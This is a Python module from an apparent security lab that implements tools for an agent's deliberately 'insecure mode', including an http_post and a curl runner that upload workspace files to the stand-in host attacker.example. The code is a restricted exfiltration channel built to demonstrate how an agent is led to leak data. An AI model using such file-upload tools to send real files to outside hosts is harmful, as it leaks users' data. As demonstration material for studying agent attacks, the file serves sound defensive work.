"""Direct tool implementations used by insecure mode.

http_post and shell only deliver to attacker.example. That keeps the public
lab from becoming a general SSRF/RCE tool. In insecure mode those tools are
still allowed, which is the open door the demo shows.
"""

from __future__ import annotations

import subprocess
import urllib.error
import urllib.parse
import urllib.request

from lab.errors import ToolError
from lab.workspace import Workspace

ATTACKER_HOST = "attacker.example"
_MAX_BYTES = 64 * 1024


def list_dir(workspace: Workspace, raw_path: str) -> list[str]:
    target = workspace.resolve(raw_path)
    if not target.is_dir():
        raise ToolError("path is not a directory")
    names = []
    for entry in sorted(target.iterdir(), key=lambda item: item.name):
        suffix = "/" if entry.is_dir() else ""
        names.append(entry.name + suffix)
    return names


def read_file(workspace: Workspace, raw_path: str) -> bytes:
    target = workspace.resolve(raw_path)
    if not target.is_file():
        raise ToolError("path is not a file")
    data = target.read_bytes()
    if len(data) > _MAX_BYTES:
        raise ToolError("file exceeds 64KiB lab limit")
    return data


def _attacker_url(url: str) -> urllib.parse.ParseResult:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "http" or parsed.hostname != ATTACKER_HOST:
        raise ToolError("refusing url host")
    if parsed.port not in (None, 80):
        raise ToolError("refusing url port")
    return parsed


def http_post(workspace: Workspace, url: str, body_file: str, timeout: float = 5) -> int:
    _attacker_url(url)
    payload = read_file(workspace, body_file)
    request = urllib.request.Request(url, data=payload, method="POST")
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        with opener.open(request, timeout=timeout) as response:
            return int(response.status)
    except urllib.error.HTTPError as exc:
        return int(exc.code)
    except urllib.error.URLError as exc:
        raise ToolError(f"http_post failed: {type(exc.reason).__name__}") from exc


def run_curl(workspace: Workspace, argv: list[str], timeout: float = 8) -> int:
    if not argv or argv[0] != "curl":
        raise ToolError("shell only runs curl in this lab agent")
    url = next((arg for arg in argv if arg.startswith("http://") or arg.startswith("https://")), "")
    if not url:
        raise ToolError("curl is missing a url")
    _attacker_url(url)
    rewritten: list[str] = []
    for arg in argv:
        if arg.startswith("@"):
            path = workspace.resolve(arg[1:])
            rewritten.append("@" + str(path))
        else:
            rewritten.append(arg)
    if "--max-time" not in rewritten:
        rewritten = ["curl", "--max-time", "5", "--connect-timeout", "3", *rewritten[1:]]
    try:
        completed = subprocess.run(
            rewritten,
            cwd=str(workspace.root),
            capture_output=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise ToolError("curl timed out") from exc
    return int(completed.returncode)
